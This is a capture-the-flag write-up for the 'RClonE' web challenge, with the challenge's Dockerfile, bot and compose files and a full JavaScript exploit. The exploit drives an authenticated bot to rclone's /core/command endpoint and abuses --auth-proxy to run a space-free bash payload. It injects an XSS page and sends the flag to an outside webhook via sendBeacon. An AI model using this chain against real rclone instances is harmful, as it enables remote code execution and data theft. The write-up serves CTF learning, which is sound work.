# RClonE - Web

By: disna

## Description

```
Rclone is a CLI that syncs your files to various cloud storage. But do you know it also have a built-in web UI?
```
- Author: maple3142
- Solves: 27


The challenge consists of two containers: one that runs [`rclone`](https://github.com/rclone/rclone)'s web GUI on `rclone:5572`, and a bot that authenticates itself on said container before navigating to an URL of our choosing. The `rclone` container does not have any internet connectivity.

<details>
    <summary><code>Dockerfile</code></summary>

```Docker
FROM debian:bookworm-slim

RUN apt-get update && \
    apt-get install -y tini ca-certificates curl unzip && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*
WORKDIR /workdir

ARG RCLONE_VERSION=v1.67.0
ARG RCLONE_NAME=rclone-$RCLONE_VERSION-linux-amd64
ARG RCLONE_HASH=07c23d21a94d70113d949253478e13261c54d14d72023bb14d96a8da5f3e7722

RUN curl https://downloads.rclone.org/$RCLONE_VERSION/$RCLONE_NAME.zip -o rclone.zip && \
    echo $RCLONE_HASH rclone.zip | sha256sum -c && \
    unzip rclone.zip && \
    mv $RCLONE_NAME/rclone /usr/bin

COPY ./readflag /readflag
RUN chmod 111 /readflag

RUN useradd -ms /bin/bash ctf
USER ctf

ENTRYPOINT ["tini", "--"]
CMD rclone rcd --rc-addr 0.0.0.0:5572 --rc-web-gui --rc-user $SECRET --rc-pass $SECRET --rc-web-gui-no-open-browser
```
</details>

<details>
    <summary><code>bot.js</code></summary>

```javascript
const puppeteer = require('puppeteer')

const SECRET = process.env.SECRET || 'secret'
const sleep = async ms => new Promise(resolve => setTimeout(resolve, ms))

const auth = `${SECRET}:${SECRET}`
const SITE = process.env.SITE || 'http://rclone:5572'
const tmpurl = new URL(`/?login_token=${encodeURIComponent(btoa(auth))}`, SITE)
tmpurl.username = SECRET
tmpurl.password = SECRET
const LOGIN_URL = tmpurl.href
console.log('[+] LOGIN_URL:', LOGIN_URL)

let browser = null

const visit = async url => {
        let context = null
        try {
                if (!browser) {
                        const args = ['--js-flags=--jitless,--no-expose-wasm', '--disable-gpu', '--disable-dev-shm-usage']
                        if (new URL(SITE).protocol === 'http:') {
                                args.push(`--unsafely-treat-insecure-origin-as-secure=${SITE}`)
                        }
                        browser = await puppeteer.launch({
                                headless: 'new',
                                args
                        })
                }

                context = await browser.createBrowserContext()

                const page1 = await context.newPage()
                await page1.goto(LOGIN_URL)
                await page1.close()

                const page2 = await context.newPage()
                await Promise.race([
                        page2.goto(url, {
                                waitUntil: 'networkidle0'
                        }),
                        sleep(5000)
                ])
                await page2.close()

                await context.close()
                context = null
        } catch (e) {
                console.log(e)
        } finally {
                if (context) await context.close()
        }
}

module.exports = visit

if (require.main === module) {
        visit('http://example.com')
}
```
</details>

<details>
        <summary><code>docker-compose.yaml</code></summary>

```yaml
services:
  rclone:
    image: rclone
    build: .
    environment:
      - SECRET=secret  # randomized secret per instancer
    networks:
      - chall
  bot:
    image: rclone-bot
    build: ./bot
    environment:
      - TITLE=Admin Bot for RClonE
      - PORT=8000
      - URL_CHECK_REGEX=^https?://.{1,256}$
      - SECRET=secret  # randomized secret per instancer
    security_opt:
      - seccomp=chrome.json
    ports:
      - "${PORT}:8000"
    networks:
      - default
      - chall
networks:
  chall:
    internal: true
```
</details>

`rclone` is a tool used to transfer files, much like `rsync`, between local and compatible cloud storage formats (e.g., S3). The goal of the challenge is to execute `/readflag` on the `rclone` container, and read out the result somehow.

## Solution description

The web GUI conveniently exposes a `/core/command` endpoint, which we can access from any origin through `no-cors` requests, and essentially lets us run any `rclone` command as if we ran it from the terminal, such as `rclone sync`, `rclone ls`, etc., with an arbitrary set of arguments. How convenient!

A grep through the `rclone` codebase reveals `exec.Command` being used a couple of times. Notably, in `cmd/serve/proxy/proxy.go`, we find:

```go
func (p *Proxy) run(in map[string]string) (config configmap.Simple, err error) {
	cmd := exec.Command(p.cmdLine[0], p.cmdLine[1:]...)
```

And, a snippet from the output of `rclone serve http --help`:

```
### Auth Proxy

If you supply the parameter `--auth-proxy /path/to/program` then
rclone will use that program to generate backends on the fly which
then are used to authenticate incoming requests.
```

An easy way to execute arbitrary binaries, by simply sending an authenticated request (e.g., `a:b@rclone:8080`)! One might assume that the `--auth-proxy` option only admits executing binaries without arguments, but the implementation of it in `cmd/serve/proxy/proxy.go` implies arguments do get sent to it. `p.cmdLine` gets populated from `strings.Fields(opt.AuthProxy)`, so we send it a space-separated `/bin/bash -c <PAYLOAD>` argument. There is a little fiddling involved, because `<PAYLOAD>` cannot contain any spaces, but [this blog](https://www.betterhacker.com/2016/10/command-injection-without-spaces.html) details a way to use a payload that does not contain spaces.

To read out the flag, we also run `rclone rcd http /tmp --rc-addr 0.0.0.0:8079`, to expose all files in `/tmp` over HTTP. Then, a payload to pipe the output of `/readflag` into `/tmp/flag.txt` and a subsequent request to `rclone:8079/flag.txt` _should_ be sufficient to extract the flag, and from there we can send if to a webhook we own to win.

## Summary
- Send bot to our domain
- Have the bot send `no-cors` commands to `/core/command` to set up a HTTP server on `rclone:8080`, for RCE, and `rclone:8079`, for retrieving the flag.
- Send request with credentials to `rclone:8080`
- Retrieve flag from `rclone:8079/flag.txt`
- win

<details>
        <summary><code>index.js</code></summary>

```javascript
const leDomain = "rclone"
const rcAPIEndpoint = `http://${leDomain}:5572`;
const fakeRcAPIEndpoint = `http://a:b@${leDomain}:8080`;
const webhook = "https://exfil-addr.x.pipedream.net";
const exfilRcAPIEndpoint = `http://${leDomain}:8079`;
const ownedUrl = "https://secure.mydomain.tld";
for (let i = 0; i < 1; i++) {
    // just a threaded python server that has a route that just sleeps for 5 seconds.
    fetch(`${ownedUrl}/delay`, {
        cache: "no-store",
        mode: "no-cors",
    })
}

(async () => {
    console.log("started")
    const sleep = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
    let res;

    let innerScript = `
const webhook = "${webhook}";
navigator.sendBeacon(webhook, "xss script init");
console.log("xss script init");
(async () => {
    console.log(window.location);
    let res = await fetch("/flag.txt");
    res = await res.text();
    navigator.sendBeacon(webhook, res);
    console.log("gg!")
})();
    `.trim();
    innerScript = innerScript.split('').map(c => c.charCodeAt(0)).join(',');

    if (window.location.protocol == "https:") {
        let uServe = new URL(`${rcAPIEndpoint}/core/command`)
        uServe.searchParams.set("command", "serve")
        uServe.searchParams.set("arg", JSON.stringify(["http", "--auth-proxy", `/bin/bash -c CMD=$'\\x20<script>eval(String.fromCharCode(${innerScript}))</script>';/readflag>/tmp/flag.txt;echo$CMD>/tmp/xss.html`, "--addr", "0.0.0.0:8080", "--verbose", "--log-file", "/tmp/log", "--allow-origin", "*"]))
        uServe.searchParams.set("fs", "/")
        uServe.searchParams.set("_async", "true")
        try {
            res = fetch(uServe.href, {
                method: "POST",
                credentials: "include",
                mode: "no-cors"
            });
        } catch (e) { }
        let uRCD = new URL(`${rcAPIEndpoint}/core/command`)
        uRCD.searchParams.set("command", "rcd")
        uRCD.searchParams.set("arg", JSON.stringify(["/tmp", "--rc-addr", "0.0.0.0:8079", "--rc-allow-origin", "*", "--verbose", "--log-file", "/tmp/log-exfil"]))
        uRCD.searchParams.set("fs", "/")
        uRCD.searchParams.set("_async", "true")
        try {
            res = fetch(uRCD.href, {
                method: "POST",
                credentials: "include",
                mode: "no-cors"
            })
        } catch (e) { }
        window.open(`${fakeRcAPIEndpoint}/`, "_blank");
        await sleep(1000);
        console.log("all opened")
        window.location = `http://${leDomain}:8079/xss.html`
    } else if (window.location.protocol == "http:") {
    }
})();
```
</details>

## Notes

- The `rclone serve` and `rclone rcd` commands, when run over `/core/command`, will continue running until the connection drops. `no-cors` requests instantly drop the connection to not reveal any form of timing information to the initiator. We had to have the commands be run async instead.
- Regular fetch requests cannot have credentials in the request URI, and neither can iframe src URIs. `window.open` is okay with it though, which is what we used to trigger the authenticated request and `--auth-proxy` behavior.
- Running our domain as HTTP does not work because browsers will block non-secure requests from public domains towards private IP ranges. In this case, a request from our domain (public) towards `rclone:<port>` (private) constituted as such.
- Running our domain as HTTPS also posed a problem because the server at `rclone:8079` ran on HTTP, and sending a HTTP request would trigger a mixed-resource error.
- We also found that while trying to redirect from HTTPS to HTTP, the browser just forces HTTPS anyways. We got around this by injecting an HTML page on `rclone:8079` and navigating there instead.